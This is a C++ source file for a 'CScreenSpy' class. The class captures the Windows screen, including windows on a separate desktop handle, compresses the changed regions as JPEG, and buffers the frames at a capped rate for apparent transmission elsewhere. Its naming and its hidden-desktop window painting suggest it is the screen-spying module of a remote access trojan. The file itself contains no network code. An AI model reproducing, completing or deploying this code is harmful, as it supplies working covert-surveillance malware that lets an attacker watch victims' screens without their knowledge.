// ScreenSpy.cpp: implementation of the CScreenSpy class.
//
//////////////////////////////////////////////////////////////////////
#include "StdAfx.h"
#include "ScreenSpy.h"
#ifdef _CONSOLE
#include <stdio.h>
#endif

#define RGB2GRAY(r,g,b) (((b)*117 + (g)*601 + (r)*306) >> 10)

#define DEF_YSTEP	10
#define DEF_XSTEP	32
//#define DEF_STEP	19
//#define OFF_SET		24
// 
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

int iScreenX;//获取桌面x坐标
int iScreenY;//获取桌面y坐标
int    i_nFullWidth;
int    i_nFullHeight;
static BOOL PaintWindow(HWND hWnd, HDC hDc, HDC hDcScreen)
{
	BOOL ret = FALSE;
	RECT rect;
	GetWindowRect(hWnd, &rect);

	HDC     hDcWindow = CreateCompatibleDC(hDc);
	HBITMAP hBmpWindow = CreateCompatibleBitmap(hDc, rect.right - rect.left, rect.bottom - rect.top);

	SelectObject(hDcWindow, hBmpWindow);

	if (PrintWindow(hWnd, hDcWindow, 0))
	{
		BitBlt(hDcScreen,
			rect.left - iScreenX,
			rect.top - iScreenY,
			rect.right - rect.left,
			rect.bottom - rect.top,
			hDcWindow,
			0,
			0,
			SRCCOPY);

		ret = TRUE;
	}
	DeleteObject(hBmpWindow);
	DeleteDC(hDcWindow);
	return ret;
}
static void EnumWindowsTopToDown(HWND owner, WNDENUMPROC proc, LPARAM param)
{
	HWND currentWindow = GetTopWindow(owner);
	if (currentWindow == NULL)
		return;
	if ((currentWindow = GetWindow(currentWindow, GW_HWNDLAST)) == NULL)
		return;
	while (proc(currentWindow, param) && (currentWindow = GetWindow(currentWindow, GW_HWNDPREV)) != NULL);
}

static BOOL CALLBACK EnumHwndsPrint(HWND hWnd, LPARAM lParam)
{
	EnumHwndsPrintData* data = (EnumHwndsPrintData*)lParam;

	if (!IsWindowVisible(hWnd))
		return TRUE;

	PaintWindow(hWnd, data->hDc, data->hDcScreen);
	DWORD style = GetWindowLongA(hWnd, GWL_EXSTYLE);
	SetWindowLongA(hWnd, GWL_EXSTYLE, style | WS_EX_COMPOSITED);

	OSVERSIONINFOA versionInfo;
	versionInfo.dwOSVersionInfoSize = sizeof(versionInfo);
	GetVersionExA(&versionInfo);
	if (versionInfo.dwMajorVersion < 6)
		EnumWindowsTopToDown(hWnd, EnumHwndsPrint, (LPARAM)data);
	return TRUE;
}


CScreenSpy::CScreenSpy(HDESK  temp_g_hDesk, int biBitCount, bool bIsGray, UINT nMaxFrameRate)
{
	m_biBitCount = 32;
	if (!SelectInputWinStation())
	{
		m_hDeskTopWnd = GetDesktopWindow();
		m_hDeskTopDC = GetDC(m_hDeskTopWnd);
	}
	g_hDesk = temp_g_hDesk;


	m_SendUALITY = 85;
	m_bAlgorithm = COMMAND_SCREEN_ALGORITHM_HOME_HIDE; // 默认使用家用办公算法
	m_dwLastCapture = GetTickCount();
	m_nMaxFrameRate = nMaxFrameRate;
	m_dwSleep = 1000 / nMaxFrameRate;
	m_bIsGray = bIsGray;
	HDC hdc = GetDC(NULL);
	int client_width_now = GetDeviceCaps(hdc, HORZRES);      // 宽  
	int client_height_now = GetDeviceCaps(hdc, VERTRES);     // 高  
	int client_width_old = GetDeviceCaps(hdc, DESKTOPHORZRES);
	int client_height_old = GetDeviceCaps(hdc, DESKTOPVERTRES);
	fDpiRatio = (float)client_width_old / (float)client_width_now;
	ReleaseDC(NULL, hdc);
	m_nFullWidth = (int)((float)(::GetSystemMetrics(SM_CXVIRTUALSCREEN)) * fDpiRatio);
	m_nFullHeight = (int)((float)(::GetSystemMetrics(SM_CYVIRTUALSCREEN)) * fDpiRatio);
	m_nFullWidth % 2 ? (m_nFullWidth--) : m_nFullWidth;
	m_nFullHeight % 2 ? (m_nFullHeight++) : m_nFullHeight;
	i_nFullWidth = m_nFullWidth;
	i_nFullHeight = m_nFullHeight;

	iScreenX = (int)((float)(::GetSystemMetrics(SM_XVIRTUALSCREEN)) * fDpiRatio);
	iScreenY = (int)((float)(::GetSystemMetrics(SM_YVIRTUALSCREEN)) * fDpiRatio);
	m_iScreenX = iScreenX;
	m_iScreenY = iScreenY;


	m_nIncSize = 32 / m_biBitCount;
	m_nScanLine = 0;

	m_hLastMemDC = ::CreateCompatibleDC(m_hDeskTopDC);
	m_hCurrMemDC = ::CreateCompatibleDC(m_hDeskTopDC);
	m_hRectMemDC = ::CreateCompatibleDC(m_hDeskTopDC);
	m_lpvLastBits = NULL;
	m_lpvCurrBits = NULL;

	m_lpbmi_full = ConstructBitmapInfo(m_biBitCount, m_nFullWidth, m_nFullHeight);
	m_lpbmi_rect = ConstructBitmapInfo(m_biBitCount, m_nFullWidth, m_nFullHeight);

	m_hLastBitmap = ::CreateDIBSection(m_hDeskTopDC, m_lpbmi_full, DIB_RGB_COLORS, &m_lpvLastBits, NULL, NULL);
	m_hCurrBitmap = ::CreateDIBSection(m_hDeskTopDC, m_lpbmi_full, DIB_RGB_COLORS, &m_lpvCurrBits, NULL, NULL);

	::SelectObject(m_hLastMemDC, m_hLastBitmap);
	::SelectObject(m_hCurrMemDC, m_hCurrBitmap);

	data.hDc = m_hDeskTopDC;

	// 足够了
	m_changedBuffer = new BYTE[m_lpbmi_full->bmiHeader.biSizeImage * 2];
	m_changedOffset = 0;
	m_nPerLineDataSize = m_lpbmi_full->bmiHeader.biSizeImage / m_nFullHeight;
}
CScreenSpy::~CScreenSpy()
{
	::ReleaseDC(NULL, m_hDeskTopDC);
	::DeleteDC(m_hRectMemDC);
	::DeleteDC(m_hCurrMemDC);
	::DeleteDC(m_hLastMemDC);
	::DeleteObject(m_hCurrBitmap);
	::DeleteObject(m_hLastBitmap);

	if (m_changedBuffer)
		delete[] m_changedBuffer;
	if (m_lpbmi_rect)
		delete[] m_lpbmi_rect;
	if (m_lpbmi_full)
		delete[] m_lpbmi_full;
}

LPVOID CScreenSpy::getFirstScreen(LPDWORD lpdwBytes)
{
	if (lpdwBytes == NULL || m_changedBuffer == NULL)
		return NULL;

	// 切换到当前输入桌面
	SelectInputWinStation();

	// 重置变化缓冲区偏移
	m_changedOffset = 0;

	// 写入使用了哪种算法
	BYTE	algorithm = (BYTE)m_bAlgorithm;
	WriteChangedBuffer((LPBYTE)&algorithm, sizeof(algorithm));

	data.hDc = m_hDeskTopDC;
	data.hDcScreen = m_hLastMemDC;
	EnumWindowsTopToDown(NULL, EnumHwndsPrint, (LPARAM)&data);


	if (algorithm == COMMAND_SCREEN_ALGORITHM_HOME_HIDE)
	{
		void* bitstream = NULL; int bitstreamlen;
		bitstreamlen = BMP_JPG(m_nFullWidth, m_nFullHeight, m_biBitCount, m_SendUALITY, m_lpvLastBits, &bitstream);
		if (bitstreamlen > 0)
		{
			WriteChangedBuffer((LPBYTE)bitstream, bitstreamlen);
		}
		if (bitstream) free(bitstream);
	}

	*lpdwBytes = m_changedOffset;
	return m_changedBuffer;
}

LPVOID CScreenSpy::getNextScreen(LPDWORD lpdwBytes)
{
	//QueryPerformanceCounter(&nBeginTime);
	if (lpdwBytes == NULL || m_changedBuffer == NULL)
		return NULL;
	// 切换到当前输入桌面
	SelectInputWinStation();

	// 重置变化缓冲区偏移
	m_changedOffset = 0;

	// 写入使用了哪种算法
	BYTE	algorithm = (BYTE)m_bAlgorithm;
	WriteChangedBuffer((LPBYTE)&algorithm, sizeof(algorithm));


	data.hDc = m_hDeskTopDC;
	data.hDcScreen = m_hCurrMemDC;
	// 获取发生变化的数据
	EnumWindowsTopToDown(NULL, EnumHwndsPrint, (LPARAM)&data);

	if (algorithm == COMMAND_SCREEN_ALGORITHM_HOME_HIDE)
	{
		ScanChangedRect(TRUE);
	}

	*lpdwBytes = m_changedOffset;

	// 限制发送帧的速度
	while (GetTickCount() - m_dwLastCapture < m_dwSleep)
		Sleep(10);
	InterlockedExchange((LPLONG)&m_dwLastCapture, GetTickCount());
	return m_changedBuffer;
}




void CScreenSpy::WriteChangedBuffer(LPBYTE lpData, int nCount)
{
	memcpy(m_changedBuffer + m_changedOffset, lpData, nCount);
	m_changedOffset += nCount;
}

LPBITMAPINFO CScreenSpy::ConstructBitmapInfo(int biBitCount, int biWidth, int biHeight)
{
	int	color_num = biBitCount <= 8 ? 1 << biBitCount : 0;
	int nBISize = sizeof(BITMAPINFOHEADER) + (color_num * sizeof(RGBQUAD));
	BITMAPINFO* lpbmi = (BITMAPINFO*) new BYTE[nBISize];
	BITMAPINFOHEADER* lpbmih = &(lpbmi->bmiHeader);
	lpbmih->biSize = sizeof(BITMAPINFOHEADER);
	lpbmih->biWidth = biWidth;
	lpbmih->biHeight = biHeight;
	lpbmih->biPlanes = 1;
	lpbmih->biBitCount = biBitCount;
	lpbmih->biCompression = BI_RGB;
	lpbmih->biXPelsPerMeter = 0;
	lpbmih->biYPelsPerMeter = 0;
	lpbmih->biClrUsed = 0;
	lpbmih->biClrImportant = 0;
	lpbmih->biSizeImage = (((lpbmih->biWidth * lpbmih->biBitCount + 31) & ~31) >> 3) * lpbmih->biHeight;
	return lpbmi;
}

LPBITMAPINFO CScreenSpy::getBitmapInfo()
{
	return m_lpbmi_full;
}

UINT CScreenSpy::getBitmapInfoSize()
{
	int	color_num = m_biBitCount <= 8 ? 1 << m_biBitCount : 0;

	return sizeof(BITMAPINFOHEADER) + (color_num * sizeof(RGBQUAD));
}



BOOL CScreenSpy::SelectDesktop(TCHAR* name)
{
	HDESK desktop;

	if (name != NULL)
	{
		// Attempt to open the named desktop
		desktop = OpenDesktop(name, 0, FALSE,
			DESKTOP_CREATEMENU | DESKTOP_CREATEWINDOW |
			DESKTOP_ENUMERATE | DESKTOP_HOOKCONTROL |
			DESKTOP_WRITEOBJECTS | DESKTOP_READOBJECTS |
			DESKTOP_SWITCHDESKTOP | GENERIC_WRITE);
	}
	else
	{
		// No, so open the input desktop
		desktop = OpenInputDesktop(0, FALSE,
			DESKTOP_CREATEMENU | DESKTOP_CREATEWINDOW |
			DESKTOP_ENUMERATE | DESKTOP_HOOKCONTROL |
			DESKTOP_WRITEOBJECTS | DESKTOP_READOBJECTS |
			DESKTOP_SWITCHDESKTOP | GENERIC_WRITE);
	}

	// Did we succeed?
	if (desktop == NULL) {
		return FALSE;
	}

	// Switch to the new desktop
	if (!SelectHDESK(desktop)) {
		// Failed to enter the new desktop, so free it!
		CloseDesktop(desktop);
		return FALSE;
	}

	// We successfully switched desktops!
	return TRUE;
}


BOOL CScreenSpy::SelectHDESK(HDESK new_desktop)
{
	HDESK old_desktop = GetThreadDesktop(GetCurrentThreadId());

	DWORD dummy;
	char new_name[256];

	if (!GetUserObjectInformation(new_desktop, UOI_NAME, &new_name, 256, &dummy)) {
		return FALSE;
	}

	// Switch the desktop
	if (!SetThreadDesktop(new_desktop)) {
		return FALSE;
	}

	// Switched successfully - destroy the old desktop
	CloseDesktop(old_desktop);

	return TRUE;
}

BOOL CScreenSpy::SelectInputWinStation()
{
	//	BOOL bRet = SwitchInputDesktop();


	if (g_hDesk)
	{
		ReleaseDC(NULL, m_hDeskTopDC);
		m_hDeskTopDC = GetDC(NULL);
		return TRUE;
	}
	return FALSE;
}


int CScreenSpy::BMP_JPG(int width, int height, int cbit, int quality, void* input, void** output)
{
	struct jpeg_compress_struct jcs;
	struct jpeg_error_mgr jem;
	unsigned long outlen = 0;

	// 设置错误处理
	jcs.err = jpeg_std_error(&jem);
	// 创建压缩结构
	jpeg_create_compress(&jcs);
	// 设置写入(输出)位置
	jpeg_mem_dest(&jcs, (unsigned char**)output, &outlen);
	// 设置必须参数
	switch (cbit)
	{
	case 16:
		jcs.in_color_space = JCS_EXT_RGB;
		jcs.input_components = 3;
		break;
	case 24:
		jcs.in_color_space = JCS_EXT_BGR;
		jcs.input_components = 3;
		break;
	case 32:
		jcs.in_color_space = JCS_EXT_BGRA;
		jcs.input_components = 4;
		break;
	default:
		jpeg_destroy_compress(&jcs);
		return -1;
	}
	jcs.image_width = width;
	jcs.image_height = height;
	// 填写其它默认参数
	jpeg_set_defaults(&jcs);
	// 设置图像品质, 取值范围是[0-100], 0表示渣画质，100表示满画质
	jpeg_set_quality(&jcs, quality, true);
	// 开始压缩图像
	jpeg_start_compress(&jcs, true);
	int line_stride = (jcs.image_width * cbit / 8 + 3) / 4 * 4;
	while (jcs.next_scanline < jcs.image_height)
	{
		unsigned char* pline = (unsigned char*)input + jcs.next_scanline * line_stride;
		jpeg_write_scanlines(&jcs, &pline, 1);
	}
	// 完成图像压缩
	jpeg_finish_compress(&jcs);
	// 释放相关资源
	jpeg_destroy_compress(&jcs);

	return outlen;
}


void CScreenSpy::CopyChangedRect(LPRGNDATA lpRgnData, DWORD dwRgnSize)
{
	LPRECT lpChangedRect = (LPRECT)lpRgnData->Buffer;
	void* bitstream = NULL; int bitstreamlen;

	for (int i = 0; i < (int)(lpRgnData->rdh.nCount); i++)
	{
		int nChangedRectWidth = lpChangedRect[i].right - lpChangedRect[i].left;
		int nChangedRectHeight = lpChangedRect[i].bottom - lpChangedRect[i].top;

		m_lpbmi_rect->bmiHeader.biWidth = nChangedRectWidth;
		m_lpbmi_rect->bmiHeader.biHeight = nChangedRectHeight;
		m_lpbmi_rect->bmiHeader.biSizeImage = (((nChangedRectWidth * m_biBitCount + 31) & ~31) >> 3) * nChangedRectHeight;

		m_lpvRectBits = NULL;
		m_hRectBitmap = ::CreateDIBSection(m_hDeskTopDC, m_lpbmi_rect, DIB_RGB_COLORS, &m_lpvRectBits, NULL, NULL);
		::SelectObject(m_hRectMemDC, m_hRectBitmap);

		::BitBlt(m_hLastMemDC, lpChangedRect[i].left, lpChangedRect[i].top, nChangedRectWidth,
			nChangedRectHeight, m_hCurrMemDC, lpChangedRect[i].left, lpChangedRect[i].top, SRCCOPY);
		::BitBlt(m_hRectMemDC, 0, 0, nChangedRectWidth,
			nChangedRectHeight, m_hCurrMemDC, lpChangedRect[i].left, lpChangedRect[i].top, SRCCOPY);


		bitstreamlen = BMP_JPG(nChangedRectWidth, nChangedRectHeight, m_biBitCount, m_SendUALITY, m_lpvRectBits, &bitstream);
		if (bitstreamlen > 0)
		{
			WriteChangedBuffer((LPBYTE)&bitstreamlen, sizeof(int));
			WriteChangedBuffer((LPBYTE)bitstream, bitstreamlen);
			WriteChangedBuffer((LPBYTE)&lpChangedRect[i], sizeof(RECT));
		}
		::DeleteObject(m_hRectBitmap);
		if (bitstream) free(bitstream);
	}
}



BOOL CScreenSpy::ScanChangedRect(BOOL bCopyChangedRect)
{
	LPDWORD p1, p2; RECT changedRect; HRGN hRgnChanged = NULL, hRgnCombine;

	for (int y = m_nScanLine; y < m_nFullHeight; y += DEF_YSTEP) // m_nScanLine 为 0, 是最后一行
	{
		p1 = (LPDWORD)((LPBYTE)m_lpvLastBits + (m_nFullHeight - 1 - y) * m_nPerLineDataSize);
		p2 = (LPDWORD)((LPBYTE)m_lpvCurrBits + (m_nFullHeight - 1 - y) * m_nPerLineDataSize);
		for (int x = 0; x < m_nFullWidth; )
		{
			if (*p1 == *p2)
			{
				p1++;
				p2++;
				x += m_nIncSize;
				continue;
			}
			if (!bCopyChangedRect)
				return TRUE;
			changedRect.left = max(x - DEF_XSTEP, 0);
			changedRect.top = max(y - DEF_YSTEP, 0);
			changedRect.right = min(x + DEF_XSTEP, m_nFullWidth);
			changedRect.bottom = min(y + DEF_YSTEP, m_nFullHeight);
			if (hRgnChanged == NULL)
				hRgnChanged = CreateRectRgnIndirect(&changedRect);
			else
			{
				hRgnCombine = CreateRectRgnIndirect(&changedRect);
				CombineRgn(hRgnChanged, hRgnChanged, hRgnCombine, RGN_OR);
				DeleteObject(hRgnCombine);
			}
			p1 += DEF_XSTEP / m_nIncSize;
			p2 += DEF_XSTEP / m_nIncSize;
			x += DEF_XSTEP;
		}
	}

	m_nScanLine = (m_nScanLine + 3) % DEF_YSTEP;
	if (hRgnChanged)
	{
		DWORD dwRgnSize = GetRegionData(hRgnChanged, 0, NULL);
		LPRGNDATA lpRgnData = (LPRGNDATA) new BYTE[dwRgnSize];
		GetRegionData(hRgnChanged, dwRgnSize, lpRgnData);
		DeleteObject(hRgnChanged);
		CopyChangedRect(lpRgnData, dwRgnSize);
		delete[] lpRgnData;
		return TRUE;
	}
	return FALSE;
}


void CScreenSpy::setAlgorithm(UINT nAlgorithm)
{
	InterlockedExchange((LPLONG)&m_bAlgorithm, nAlgorithm);
}

void CScreenSpy::SendUALITY(int i)
{
	m_SendUALITY = i;
}

void CScreenSpy::SetFps(int nfps)
{
	m_dwSleep = 1000 / nfps;
}